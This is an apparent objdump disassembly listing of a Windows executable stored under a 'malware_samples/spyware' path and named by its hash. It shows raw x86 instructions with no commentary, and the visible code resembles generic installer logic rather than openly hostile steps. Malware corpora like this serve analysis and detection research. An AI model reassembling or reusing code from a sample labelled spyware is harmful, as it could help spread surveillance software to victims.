
malware_samples/spyware/17ad820c6a27854ee3b63c7c43131a58eca48dba8ddb56405bf11059f4a41bed.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 68 43 42 00    	mov    0x424368,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 48 82 40 00    	call   *0x408248
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 70 43 42 00    	mov    0x424370,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 4c 82 40 00    	call   *0x40824c
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 50 82 40 00    	call   *0x408250
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 54 82 40 00    	call   *0x408254
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 60 3b 42 00       	push   $0x423b60
  401155:	57                   	push   %edi
  401156:	ff 15 58 82 40 00    	call   *0x408258
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 5c 82 40 00    	call   *0x40825c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 88 43 42 00       	mov    0x424388,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 8c 43 42 00    	cmp    0x42438c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 8c 43 42 00    	cmp    0x42438c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 88 43 42 00    	mov    0x424388,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 8c 43 42 00    	cmp    0x42438c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 8c 43 42 00    	cmp    0x42438c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 88 43 42 00       	mov    0x424388,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 8c 43 42 00    	cmp    %esi,0x42438c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 8c 43 42 00    	cmp    0x42438c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 70 43 42 00       	mov    0x424370,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 8c 43 42 00    	mov    0x42438c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 88 43 42 00    	mov    0x424388,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 50 42 00       	mov    $0x425000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 f6 4f 00 00       	call   0x40637c
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 90 43 42 00    	mov    0x424390,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 4c 3b 42 00    	add    %eax,0x423b4c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 34 3b 42 00    	push   0x423b34
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 4c 3b 42 00    	push   0x423b4c
  4013e4:	ff 15 3c 81 40 00    	call   *0x40813c
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 44 82 40 00    	call   *0x408244
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 70 43 42 00    	mov    0x424370,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 20 a8 40 00       	push   $0x40a820
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 18 41 00 00       	call   0x405549
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec d0 01 00 00    	sub    $0x1d0,%esp
  40143d:	a1 68 43 42 00       	mov    0x424368,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40144e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401458:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 50 42 00       	mov    $0x425000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401474:	89 0d 5c b8 40 00    	mov    %ecx,0x40b85c
  40147a:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 68 16 00 00    	ja     0x402af1
  401489:	ff 24 8d 03 2b 40 00 	jmp    *0x402b03(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 b2 40 00 00       	call   0x405549
  401497:	e9 1f 0f 00 00       	jmp    0x4023bb
  40149c:	ff 05 2c 3b 42 00    	incl   0x423b2c
  4014a2:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a5:	0f 84 10 0f 00 00    	je     0x4023bb
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 0c 82 40 00    	call   *0x40820c
  4014b2:	e9 04 0f 00 00       	jmp    0x4023bb
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 32 16 00 00       	jmp    0x402afc
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 78 40 00 00       	call   0x405549
  4014d1:	e9 1b 16 00 00       	jmp    0x402af1
  4014d6:	53                   	push   %ebx
  4014d7:	e8 67 17 00 00       	call   0x402c43
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	59                   	pop    %ecx
  4014e0:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4014e3:	7f 03                	jg     0x4014e8
  4014e5:	33 c0                	xor    %eax,%eax
  4014e7:	40                   	inc    %eax
  4014e8:	50                   	push   %eax
  4014e9:	ff 15 d0 80 40 00    	call   *0x4080d0
  4014ef:	e9 fd 15 00 00       	jmp    0x402af1
  4014f4:	ff 75 f8             	push   -0x8(%ebp)
  4014f7:	ff 15 10 82 40 00    	call   *0x408210
  4014fd:	e9 ef 15 00 00       	jmp    0x402af1
  401502:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401505:	7f 39                	jg     0x401540
  401507:	7d 0e                	jge    0x401517
  401509:	8b 04 85 e0 43 42 00 	mov    0x4243e0(,%eax,4),%eax
  401510:	a3 64 b8 40 00       	mov    %eax,0x40b864
  401515:	eb 0f                	jmp    0x401526
  401517:	c1 e0 02             	shl    $0x2,%eax
  40151a:	8b 88 e0 43 42 00    	mov    0x4243e0(%eax),%ecx
  401520:	89 88 40 44 42 00    	mov    %ecx,0x424440(%eax)
  401526:	6a 01                	push   $0x1
  401528:	e8 16 17 00 00       	call   0x402c43
  40152d:	59                   	pop    %ecx
  40152e:	89 55 c8             	mov    %edx,-0x38(%ebp)
  401531:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401534:	89 04 8d e0 43 42 00 	mov    %eax,0x4243e0(,%ecx,4)
  40153b:	e9 b1 15 00 00       	jmp    0x402af1
  401540:	c1 e0 02             	shl    $0x2,%eax
  401543:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401546:	8d 88 e0 43 42 00    	lea    0x4243e0(%eax),%ecx
  40154c:	8b 80 40 44 42 00    	mov    0x424440(%eax),%eax
  401552:	89 01                	mov    %eax,(%ecx)
  401554:	0f 8d 97 15 00 00    	jge    0x402af1
  40155a:	a1 64 b8 40 00       	mov    0x40b864,%eax
  40155f:	89 01                	mov    %eax,(%ecx)
  401561:	e9 8b 15 00 00       	jmp    0x402af1
  401566:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401569:	8d 34 85 e0 43 42 00 	lea    0x4243e0(,%eax,4),%esi
  401570:	33 c0                	xor    %eax,%eax
  401572:	8b 0e                	mov    (%esi),%ecx
  401574:	3b cb                	cmp    %ebx,%ecx
  401576:	0f 94 c0             	sete   %al
  401579:	23 4d e8             	and    -0x18(%ebp),%ecx
  40157c:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  401580:	89 0e                	mov    %ecx,(%esi)
  401582:	e9 75 15 00 00       	jmp    0x402afc
  401587:	ff 34 95 e0 43 42 00 	push   0x4243e0(,%edx,4)
  40158e:	56                   	push   %esi
  40158f:	e9 da 14 00 00       	jmp    0x402a6e
  401594:	8b 0d 30 3b 42 00    	mov    0x423b30,%ecx
  40159a:	8b 35 14 82 40 00    	mov    0x408214,%esi
  4015a0:	3b cb                	cmp    %ebx,%ecx
  4015a2:	74 07                	je     0x4015ab
  4015a4:	52                   	push   %edx
  4015a5:	51                   	push   %ecx
  4015a6:	ff d6                	call   *%esi
  4015a8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4015ab:	8b 0d 44 3b 42 00    	mov    0x423b44,%ecx
  4015b1:	3b cb                	cmp    %ebx,%ecx
  4015b3:	0f 84 38 15 00 00    	je     0x402af1
  4015b9:	50                   	push   %eax
  4015ba:	51                   	push   %ecx
  4015bb:	ff d6                	call   *%esi
  4015bd:	e9 2f 15 00 00       	jmp    0x402af1
  4015c2:	6a f0                	push   $0xfffffff0
  4015c4:	e8 9c 16 00 00       	call   0x402c65
  4015c9:	ff 75 e0             	push   -0x20(%ebp)
  4015cc:	50                   	push   %eax
  4015cd:	ff 15 d4 80 40 00    	call   *0x4080d4
  4015d3:	85 c0                	test   %eax,%eax
  4015d5:	0f 85 16 15 00 00    	jne    0x402af1
  4015db:	e9 14 12 00 00       	jmp    0x4027f4
  4015e0:	6a f0                	push   $0xfffffff0
  4015e2:	e8 7e 16 00 00       	call   0x402c65
  4015e7:	8b f8                	mov    %eax,%edi
  4015e9:	57                   	push   %edi
  4015ea:	e8 41 48 00 00       	call   0x405e30
  4015ef:	8b f0                	mov    %eax,%esi
  4015f1:	3b f3                	cmp    %ebx,%esi
  4015f3:	74 5b                	je     0x401650
  4015f5:	6a 5c                	push   $0x5c
  4015f7:	56                   	push   %esi
  4015f8:	e8 c5 47 00 00       	call   0x405dc2
  4015fd:	8b f0                	mov    %eax,%esi
  4015ff:	8a 06                	mov    (%esi),%al
  401601:	88 1e                	mov    %bl,(%esi)
  401603:	3a c3                	cmp    %bl,%al
  401605:	88 45 0b             	mov    %al,0xb(%ebp)
  401608:	75 1d                	jne    0x401627
  40160a:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  40160d:	74 18                	je     0x401627
  40160f:	e8 72 44 00 00       	call   0x405a86
  401614:	85 c0                	test   %eax,%eax
  401616:	74 0f                	je     0x401627
  401618:	57                   	push   %edi
  401619:	e8 f1 43 00 00       	call   0x405a0f
  40161e:	3b c3                	cmp    %ebx,%eax
  401620:	74 24                	je     0x401646
  401622:	ff 45 fc             	incl   -0x4(%ebp)
  401625:	eb 06                	jmp    0x40162d
  401627:	57                   	push   %edi
  401628:	e8 3c 44 00 00       	call   0x405a69
  40162d:	3b c3                	cmp    %ebx,%eax
  40162f:	74 15                	je     0x401646
  401631:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401636:	75 0b                	jne    0x401643
  401638:	57                   	push   %edi
  401639:	ff 15 d8 80 40 00    	call   *0x4080d8
  40163f:	a8 10                	test   $0x10,%al
  401641:	75 03                	jne    0x401646
  401643:	ff 45 fc             	incl   -0x4(%ebp)
  401646:	8a 45 0b             	mov    0xb(%ebp),%al
  401649:	88 06                	mov    %al,(%esi)
  40164b:	46                   	inc    %esi
  40164c:	3a c3                	cmp    %bl,%al
  40164e:	75 a5                	jne    0x4015f5
  401650:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401653:	74 29                	je     0x40167e
  401655:	6a e6                	push   $0xffffffe6
  401657:	e8 c7 fd ff ff       	call   0x401423
  40165c:	57                   	push   %edi
  40165d:	68 00 a8 42 00       	push   $0x42a800
  401662:	e8 9e 4d 00 00       	call   0x406405
  401667:	57                   	push   %edi
  401668:	ff 15 dc 80 40 00    	call   *0x4080dc
  40166e:	85 c0                	test   %eax,%eax
  401670:	0f 85 7b 14 00 00    	jne    0x402af1
  401676:	ff 45 fc             	incl   -0x4(%ebp)
  401679:	e9 73 14 00 00       	jmp    0x402af1
  40167e:	6a f5                	push   $0xfffffff5
  401680:	e9 8c 0c 00 00       	jmp    0x402311
  401685:	53                   	push   %ebx
  401686:	e8 da 15 00 00       	call   0x402c65
  40168b:	50                   	push   %eax
  40168c:	e8 07 51 00 00       	call   0x406798
  401691:	e9 a5 06 00 00       	jmp    0x401d3b
  401696:	6a d0                	push   $0xffffffd0
  401698:	e8 c8 15 00 00       	call   0x402c65
  40169d:	6a df                	push   $0xffffffdf
  40169f:	8b f0                	mov    %eax,%esi
  4016a1:	e8 bf 15 00 00       	call   0x402c65
  4016a6:	6a 13                	push   $0x13
  4016a8:	8b f8                	mov    %eax,%edi
  4016aa:	e8 b6 15 00 00       	call   0x402c65
  4016af:	57                   	push   %edi
  4016b0:	56                   	push   %esi
  4016b1:	ff 15 e0 80 40 00    	call   *0x4080e0
  4016b7:	85 c0                	test   %eax,%eax
  4016b9:	74 07                	je     0x4016c2
  4016bb:	6a e3                	push   $0xffffffe3
  4016bd:	e9 4f 0c 00 00       	jmp    0x402311
  4016c2:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4016c5:	0f 84 29 11 00 00    	je     0x4027f4
  4016cb:	56                   	push   %esi
  4016cc:	e8 c7 50 00 00       	call   0x406798
  4016d1:	85 c0                	test   %eax,%eax
